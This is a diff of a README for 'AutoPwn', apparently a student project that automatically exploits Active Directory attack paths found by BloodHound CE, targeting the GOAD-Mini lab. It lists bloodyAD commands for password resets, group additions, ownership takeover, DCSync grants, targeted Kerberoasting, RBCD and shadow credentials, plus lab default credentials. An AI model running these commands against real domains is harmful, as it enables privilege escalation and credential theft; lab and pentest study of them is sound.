@@ -1,62 +1,57 @@
-# BloodHound Automation Tool
+# AutoPwn
 
-Automated Active Directory attack path analysis using the BloodHound CE API.
+Automated Active Directory attack path exploitation using the BloodHound CE API and bloodyAD.
 
----
-
-## What is this?
-
-Manual BloodHound analysis is tedious — clicking through the UI, running queries one by one, piecing together attack paths by hand. This tool automates that process by querying BloodHound CE programmatically to enumerate attack paths, identify high-value targets, and produce structured findings without touching the UI.
-
-Target environment: **GOAD-Mini** (`sevenkingdoms.local`) — an intentionally vulnerable Active Directory lab for practicing offensive techniques.
+> **Lab use only** — tested on [GOAD-Mini](https://github.com/Orange-Cyberdefense/GOAD) (`sevenkingdoms.local`), an intentionally vulnerable AD lab.
 
 ---
 
 ## What it does
 
-- Enumerate all users, groups, and computers in the domain
-- Find shortest attack paths from any principal to Domain Admins
-- Map BloodHound edges to concrete exploitation techniques (Kerberoasting, ACL abuse, Pass-the-Hash, DCSync, GenericWrite, etc.)
-- Rank findings by path length and exploitability
-- Output structured, readable reports
+Queries BloodHound CE for attack paths, maps each edge type to a concrete exploitation technique, and executes them automatically via bloodyAD — without touching the UI.
 
-## What it does NOT do
-
-- It is not a collector — use `bloodhound-python` or `SharpHound` for data collection
-- It is not a replacement for the BloodHound UI
+**What it does NOT do:**
+- Collect AD data (use `bloodhound-python` or `SharpHound` for that)
+- Replace the BloodHound UI
 
 ---
 
 ## Requirements
 
 - Python 3.10+
-- Libraries : rich, requests
-- BloodHound CE v8.7+ (Kali package or Docker)
-- Neo4j running and populated with AD data
+- `pip install -r requirements.txt` (rich, requests, python-dotenv)
+- BloodHound CE v8.7+ running and populated
+- bloodyAD — on Linux natively, on Windows via WSL2
 - A BloodHound API token (token ID + token key)
-- GOAD-Mini lab running and collected
-
-```bash
-pip install -r requirements.txt
-```
+- A Running lab running
+- A .env file filled like is dictated by .env.example
+- Following SETUP.md
 
 ---
 
 ## Setup
 
-**1. Clone the repo**
 ```bash
 git clone https://github.com/ranialaachir/projet-integre.git
 cd projet-integre
-```
-
-**2. Create your `.env` file** (never committed)
-```bash
+pip install -r requirements.txt
 cp .env.example .env
-# Fill in your values
+# fill in your values
 ```
 
-**3. Collect AD data** (if not already done)
+**.env:**
+```env
+BLOODHOUND_TOKEN_ID=your_token_id
+BLOODHOUND_TOKEN_KEY=your_token_key
+BLOODHOUND_URL=http://<SERVER_IP>:8083
+
+DC_IP=192.168.56.10
+AD_DOMAIN=sevenkingdoms.local
+```
+
+Generate a token: BloodHound UI → top-right menu → **API Tokens** → Create Token.
+
+**Collect and ingest data first:**
 ```bash
 bloodhound-python \
   -d sevenkingdoms.local \
@@ -64,89 +59,9 @@ bloodhound-python \
   -dc kingslanding.sevenkingdoms.local \
   -ns 192.168.56.10 \
   -c All --zip
+# then upload the zip via BloodHound CE UI → File Ingest
 ```
-Then upload the zip via the BloodHound CE UI → File Ingest.
-
 ---
-
-## Configuration
-
-Copy `.env.example` to `.env` and fill in your values:
-
-```env
-BLOODHOUND_TOKEN_ID=your_token_id_here
-BLOODHOUND_TOKEN_KEY=your_token_key_here
-BLOODHOUND_URL=http://<SERVER_IP>:8083
-
-DC_IP=<AD_DN_IP>
-AD_DOMAIN=sevenkingdoms.local
-```
-
-To generate a token: BloodHound UI → top right menu → **API Tokens** → Create Token.
-
----
-
-## Project Structure
-
-```
-bloodhound-auto/
-├── entities/
-│   ├── __init__.py
-│   ├── client.py          # BHClient — stores credentials and base URL
-│   ├── edge.py            # Edge dataclass — relationship between two nodes
-│   ├── node.py            # Node dataclass — AD principal (user, group, computer)
-│   ├── path.py            # Path dataclass — ordered sequence of nodes and edges
-│   └── exploit_result.py  # Structured output from any exploit strategy
-├── exceptions/
-│   ├── __init__.py
-│   ├── auto_pwn_exception.py  # Base exception for the tool
-│   ├── hop_failed_error.py    # Raised when a single hop in a path cannot be exploited
-│   └── no_path_error.py       # Raised when no attack path exists to a target
-├── services/
-│   ├── __init__.py
-│   ├── enumeration.py     # Find users, groups, computers in the domain
-│   ├── pathfinding.py     # Shortest paths and attack path analysis
-│   ├── scoring.py         # Scoring / prioritization (scorer chaque finding par criticité)
-│   ├── parse_objects.py   # Extract nodes, edges and paths from JSON data
-│   └── reporting.py       # Output formatting and structured findings
-├── strategies/
-│   ├── __init__.py
-│   ├── exploit_strategy.py    # Abstract base class for all exploit strategies
-│   ├── dc_sync.py             # DCSync rights exploitation
-│   ├── generic_write.py       # GenericWrite ACL abuse
-│   ├── kerberoast.py          # Kerberoastable service account targeting
-│   ├── add_member.py          # Add member to a Group
-│   └── pass_the_hash.py       # Pass-the-Hash lateral movement
-├── utils/
-│   ├── __init__.py
-│   ├── auth.py            # BHAuth — HMAC request signing logic
-│   └── request.py         # BHRequest — get, post, delete HTTP methods
-│   ├── cred_store.py      # Temporary
-│   ├── platform.py        # Check the environment
-│   └── request.py         # Runs the cmd tools
-├── main.py                # Orchestrate
-├── .env                   # Your secrets (never committed)
-├── .env.example           # Template for others
-├── .gitignore
-├── requirements.txt
-└── README.md
-```
-
----
-
-## Architecture Overview
-
-The codebase is organized around four layers:
-
-- **`entities/`** — core data models (`Node`, `Edge`, `Path`) and the API client wrapper
-- **`services/`** — high-level logic: enumeration, pathfinding, and reporting
-- **`strategies/`** — pluggable exploit strategies, each mapping a BloodHound edge type to a concrete attack technique
-- **`utils/`** — low-level HTTP and authentication helpers (HMAC signing, raw requests)
-
-Exceptions are centralized under `exceptions/` to allow services and strategies to signal failure conditions cleanly without returning sentinel values.
-
----
-
 ## Key Technical Notes
 
 Many common DACL abuses can be exploited with bloodyAD --replacing many of the old net rpc, pth-net, dacledit.py, owneredit.py, targetedKerberoast.py, and pywhisker commands.
@@ -182,78 +97,100 @@ Note: if your password contains special characters like `@@`, always wrap it in 
 
 ---
 
-## Target Lab: GOAD-Mini
+## Project Structure
 
-| Property | Value |
-|---|---|
-| Domain | `sevenkingdoms.local` |
-| Domain Controller | `kingslanding.sevenkingdoms.local` |
-| DC IP | `192.168.56.10` |
-| Collection user | `vagrant` / `vagrant` (local account) |
+```
+AutoPwn/
+├── main.py                    # orchestrator
+├── entities/
+│   ├── client.py              # BHClient — API credentials + base URL
+│   ├── node.py                # Node — AD principal (user, group, computer, domain)
+│   ├── node_kind.py           # NodeKind enum
+│   ├── edge.py                # Edge — relationship between two nodes
+│   ├── edge_kind.py           # EdgeKind enum
+│   ├── path.py                # Path — ordered sequence of nodes and edges
+│   ├── exploit_result.py      # structured output from any exploit attempt
+│   └── credentials.py         # Credential dataclass (username/hash/ticket)
+├── exceptions/
+│   ├── hop_failed_error.py    # single hop could not be exploited
+│   ├── no_path_error.py       # no attack path exists to target
+│   ├── api_error.py
+│   ├── config_error.py
+│   └── exploit_error.py
+├── references/
+│   ├── cred_store.py          # known credentials (populated manually)
+│   ├── privilege_levels.py    # node privilege scoring
+│   └── color_maps.py          # output coloring
+├── services/
+│   ├── enumeration.py         # find users, groups, computers
+│   ├── pathfinding.py         # shortest paths, attack path queries
+│   ├── strategy_runner.py     # runs strategies against BH query results
+│   ├── scoring.py             # criticality scoring
+│   ├── reporting.py           # structured findings output
+│   ├── parse_objects.py       # parse nodes/edges from BH API JSON
+│   ├── printing.py            # rich console helpers
+│   ├── formatting.py
+│   └── console.py
+├── strategies/
+│   ├── exploit_strategy.py    # abstract base class
+│   ├── bloodyad_base.py       # BloodyADBase — dispatch + fallback chain
+│   ├── __init__.py            # STRATEGY_REGISTRY
+│   │
+│   ├── add_member.py          # AddMember → bloodyAD add groupMember
+│   ├── force_change_password.py
+│   ├── generic_all.py         # dispatches by target type
+│   ├── generic_write.py       # dispatches by target type
+│   ├── write_dacl.py          # GrantDCSync or GrantGenericAll
+│   ├── write_owner.py         # TakeOwnership → GrantGenericAll
+│   ├── owns.py                # GrantGenericAll (already owner)
+│   ├── dc_sync.py             # (stub)
+│   ├── kerberoast.py          # (stub)
+│   ├── admin_to.py            # (stub)
+│   ├── has_session.py         # (stub)
+│   └── read_laps.py           # (stub)
+│
+│   └── techniques/            # reusable mixin methods per category
+│       ├── ldap_techniques.py       # ✅ bloodyAD LDAP writes (done)
+│       ├── kerberos_techniques.py   # 🔲 kerberoast, delegation, S4U
+│       ├── credential_techniques.py # 🔲 dcsync, laps, secretsdump
+│       └── exec_techniques.py       # 🔲 rdp, psremote, wmi, psexec
+├── utils/
+│   ├── auth.py                # HMAC request signing
+│   ├── request.py             # BH API HTTP helpers
+│   ├── bloodyad.py            # bloodyAD command builder
+│   ├── runner.py              # subprocess execution
+│   ├── platform.py            # detect Linux / WSL2 backend
+│   └── bh_api_manager.py
+└── tmp/
+    └── shadow_creds/          # PFX + ccache files (gitignored)
+```
 
-> `vagrant` is a local machine account — it will not appear as a domain user in BloodHound. Domain users are AD principals like `JOFFREY.BARATHEON@SEVENKINGDOMS.LOCAL`.
+---
 
-## All Techniques Mapped to Edge Kinds
-| Edge Kind               |   → Technique(s)                           |
-|-------------------------|--------------------------------------------|
-| AddMember               | → AddMember
-| ForceChangePassword     | → ForceChangePassword
-| GenericWrite (User)     | → TargetedKerberoast / ShadowCredentials
-| GenericWrite (Group)    | → AddMember
-| GenericWrite (Computer) | → RBCD
-| GenericAll  (User)      | → ForceChangePassword
-| GenericAll  (Group)     | → AddMember
-| GenericAll  (Computer)  | → RBCD
-| GenericAll  (Domain)    | → DCSync via WriteDACL
-| WriteDacl   (User)      | → GrantGenericAll → then ForceChangePassword
-| WriteDacl   (Group)     | → GrantGenericAll → then AddMember
-| WriteDacl   (Domain)    | → GrantDCSync → then DCSync
-| WriteOwner              | → TakeOwnership → then WriteDACL chain
-| Owns                    | → same as WriteOwner
-| DCSync                  | → DumpNTDS (secretsdump)
-| GetChanges + GetChangesAll | → DCSync |
-| Kerberoastable        | → Kerberoast (GetSPN + hashcat) |
-| AllowedToDelegate     | → S4U2Proxy impersonation |
-| AllowedToAct (RBCD)   | → S4U2Self + S4U2Proxy |
-| CoerceToTGT           | → Coercion + relay (responder/ntlmrelayx) |
-| ReadLAPSPassword      | → Read LAPS → get local admin creds |
-| CanRDPTo              | → RDP session |
-| CanPSRemoteTo         | → WinRM / PSRemoting session |
-| AdminTo               | → WMI / PSExec / SMB exec |
+## Architecture
 
-Let us group them by category :
-```
-strategies/
-├── techniques/
-│   ├── __init__.py              ← exports everything
-│   ├── ldap_techniques.py       ← bloodyAD LDAP writes
-│   ├── kerberos_techniques.py   ← kerberoast, delegation, S4U
-│   ├── credential_techniques.py ← dcsync, laps, secretsdump
-│   └── exec_techniques.py       ← rdp, psremote, wmi, psexec
-```
-## BloodyAD
-```
-BloodyADBase (has exploit() with fallback chain)
-├── ForceChangePasswordStrategy    ← bloodyAD: set password
-├── AddMemberStrategy              ← bloodyAD: add groupMember
-├── GenericAllStrategy             ← bloodyAD: dispatches based on target
-├── GenericWriteStrategy           ← bloodyAD: dispatches based on target
-├── WriteDaclStrategy              ← bloodyAD: add dcsync / add genericAll
-├── WriteOwnerStrategy             ← bloodyAD: set owner
-├── AddKeyCredentialLinkStrategy   ← bloodyAD: add shadowCredentials
-├── WriteSPNStrategy               ← bloodyAD: set servicePrincipalName
-└── OwnsStrategy                   ← same as WriteOwner (you're already owner)
-```
+Four layers:
 
-## ldap Techniques
-```
-project/
-├── .gitignore
-├── tmp/                    ← gitignored
-│   └── shadow_creds/       ← all PFX/ccache files go here
-│       ├── .gitkeep        ← keeps folder in git without contents
-│       └── (generated files, ignored)
-```
+- **`entities/`** — core data models (`Node`, `Edge`, `Path`, `Credential`, `ExploitResult`)
+- **`services/`** — high-level logic: enumeration, pathfinding, strategy execution, reporting
+- **`strategies/`** — one class per BloodHound edge type, each with a `_DISPATCH` table mapping target node kinds to technique methods
+- **`utils/`** — low-level helpers: HTTP, HMAC auth, subprocess runner, platform detection
+
+Techniques are implemented as mixins in `strategies/techniques/` and shared across strategies. `BloodyADBase` provides the fallback chain: if the first technique in a dispatch list fails, the next one is tried automatically.
+
+---
+
+## Implemented Strategies
+
+| Strategy | Edge | Techniques |
+|---|---|---|
+| `AddMemberStrategy` | `AddMember` | bloodyAD `add groupMember` |
+| `ForceChangePasswordStrategy` | `ForceChangePassword` | bloodyAD `set password` |
+| `GenericAllStrategy` | `GenericAll` | ShadowCredentials → ForceChangePassword (User) / AddMember (Group) / RBCD (Computer) / GrantDCSync (Domain) |
+| `GenericWriteStrategy` | `GenericWrite` | ShadowCredentials → TargetedKerberoast (User) / AddMember (Group) / RBCD (Computer) |
+| `WriteDaclStrategy` | `WriteDACL` | GrantDCSync (Domain) / GrantGenericAll (others) |
+| `WriteOwnerStrategy` | `WriteOwner` | TakeOwnership → GrantGenericAll |
+| `OwnsStrategy` | `Owns` | GrantGenericAll (already owner) |
 
 ### Mapping
 
@@ -267,87 +204,147 @@ project/
 | WriteSPN, GenericAll→User, GenericWrite→User |	_do_targeted_kerberoast	| User |
 | WriteAccountRestrictions, GenericAll→Computer |	_do_rbcd |	Computer |
 
-### Each Command
-1. ForceChangePassword
-``` Bash
+---
+
+## bloodyAD Command Reference
+
+All LDAP techniques ultimately call bloodyAD. This section documents each command for reference and manual testing.
+
+### 1. ForceChangePassword
+```bash
 bloodyAD --host <DC_IP> -d <domain.local> \
-  -u <attacker_Sam> -p <Hash NTLM or password> \
-  set password <victim_SAM> <'NewPassword'>
+  -u <attacker_sam> -p <hash_or_password> \
+  set password <victim_sam> <'NewPassword'>
 ```
-  - Output:
-``` Output
+```
 [+] Password changed successfully!
 ```
-2. AddMember
-``` Bash
+
+### 2. AddMember
+```bash
 bloodyAD --host <DC_IP> -d <domain.local> \
-  -u <attacker_Sam> -p <Hash NTLM or password> \
-  add groupMember <target_group> <attacker_Sam>
+  -u <attacker_sam> -p <hash_or_password> \
+  add groupMember <target_group> <attacker_sam>
 ```
-  - Output:
-``` Output
-[+] attacker_Sam added to target_groups
 ```
-3. TakeOwnership
-``` Bash
+[+] attacker_sam added to target_group
+```
+
+### 3. TakeOwnership
+```bash
 bloodyAD --host <DC_IP> -d <domain.local> \
-  -u <attacker_SAM> -p <Hash NTLM or password> \
-  set owner <victim_Sam> <attacker_Sam>
+  -u <attacker_sam> -p <hash_or_password> \
+  set owner <victim_sam> <attacker_sam>
 ```
-  - Output:
-``` Output
-[+] Old owner S-1-5-21-... is now replaced by attacker_Sam on victim_Sam
 ```
-4. GrantDCSync (WriteDacl on Domain)
-``` Bash
+[+] Old owner S-1-5-21-... is now replaced by attacker_sam on victim_sam
+```
+
+### 4. GrantGenericAll
+```bash
 bloodyAD --host <DC_IP> -d <domain.local> \
-  -u <attacker_Sam> -p <Hash NTLM or password> \
-  add dcsync <attacker_Sam>
+  -u <attacker_sam> -p <hash_or_password> \
+  add genericAll <target_sam> <attacker_sam>
 ```
-  - Output:
-``` Output
-[+] attacker_Sam has now dcsync rights on domain.local
 ```
-5. TargetedKerberoast
-``` Bash
+[+] attacker_sam has now GenericAll on target_sam
+```
+
+### 5. GrantDCSync (WriteDACL on Domain)
+```bash
 bloodyAD --host <DC_IP> -d <domain.local> \
-  -u <attacker_Sam> -p <Hash NTLM or password> \
-  add object <target_Sam> <servicePrincipalName> \
+  -u <attacker_sam> -p <hash_or_password> \
+  add dcsync <attacker_sam>
+```
+```
+[+] attacker_sam has now dcsync rights on domain.local
+```
+
+### 6. TargetedKerberoast
+```bash
+bloodyAD --host <DC_IP> -d <domain.local> \
+  -u <attacker_sam> -p <hash_or_password> \
+  set object <target_sam> servicePrincipalName \
   -v "fake/roast.domain.local"
 ```
-  - Output:
-``` Output
-[+] target_Sam's servicePrincipalName has been updated
 ```
-6. RBCD
-``` Bash
+[+] target_sam's servicePrincipalName has been updated
+```
+
+### 7. RBCD
+```bash
 bloodyAD --host <DC_IP> -d <domain.local> \
-  -u <attacker_Sam> -p <Hash NTLM or password> \
-  add rbcd <'DOMAIN$'> <'ATTACKERPC$'>
+  -u <attacker_sam> -p <hash_or_password> \
+  add rbcd <'TARGET$'> <'ATTACKER$'>
 ```
-  - Output:
-``` Output
+```
 [+] Delegation rights modified successfully!
-ATTACKERPC$ can now impersonate users on DOMAIN$
+ATTACKER$ can now impersonate users on TARGET$
 ```
-7. ShadowCredentials
-``` Bash
+
+### 8. ShadowCredentials
+```bash
 bloodyAD --host <DC_IP> -d <domain.local> \
-  -u <attacker_Sam> -p <Hash NTLM or password> \
-  add shadowCredentials <victim_Sam>
+  -u <attacker_sam> -p <hash_or_password> \
+  add shadowCredentials <victim_sam>
 ```
-  - Output:
-``` Output
+```
 [+] KeyCredential generated with following sha256 of RSA key: 71c9...
-[+] TGT stored in ccache file victim_Sam_WS.ccache
+[+] TGT stored in ccache file victim_sam_Xx.ccache
 NT: 9029cf007326107eb1c519c84ea60dbe
 ```
+> Requires PKINIT support (a CA enrolled in the domain). If not available, bloodyAD will fail and the tool cleans up automatically.
+
+---
+
+## Adding a Strategy
+
+```python
+# strategies/my_strategy.py
+from dataclasses import dataclass
+from .bloodyad_base import BloodyADBase
+from .techniques.ldap_techniques import ADTechniquesMixin
+from entities.edge_kind import EdgeKind
+from entities.node_kind import NodeKind
+
+@dataclass
+class MyStrategy(ADTechniquesMixin, BloodyADBase):
+    _DISPATCH = {
+        NodeKind.USER: [
+            ("TechniqueName", ADTechniquesMixin._do_something),
+        ],
+    }
+
+    def can_exploit(self) -> bool:
+        return self.edge.kind == EdgeKind.MY_EDGE
+```
+
+Then register it in `strategies/__init__.py`:
+```python
+from .my_strategy import MyStrategy
+
+STRATEGY_REGISTRY = [
+    ...
+    (MyStrategy, "MyEdge", "Base", "User"),
+]
+```
+
+---
+
+## Target Lab: GOAD-Mini
+
+| Property | Value |
+|---|---|
+| Domain | `sevenkingdoms.local` |
+| DC | `kingslanding.sevenkingdoms.local` |
+| DC IP | `192.168.56.10` |
+| Collection user | `vagrant` / `vagrant` (local account, not a domain user) |
 
 ---
 
 ## References
 
-- [BloodHound CE Docs](https://support.bloodhoundenterprise.io/)
-- [GOAD - Game of Active Directory](https://github.com/Orange-Cyberdefense/GOAD)
-- [BloodHound API Spec](http://localhost:8080/api/v2/spec) (local, requires running instance)
+- [GOAD — Game of Active Directory](https://github.com/Orange-Cyberdefense/GOAD)
 - [BloodyAD](https://github.com/CravateRouge/bloodyAD)
+- [BloodHound CE Docs](https://support.bloodhoundenterprise.io/)
+- [BloodHound API Spec](http://localhost:8083/api/v2/spec) (local, requires running instance)
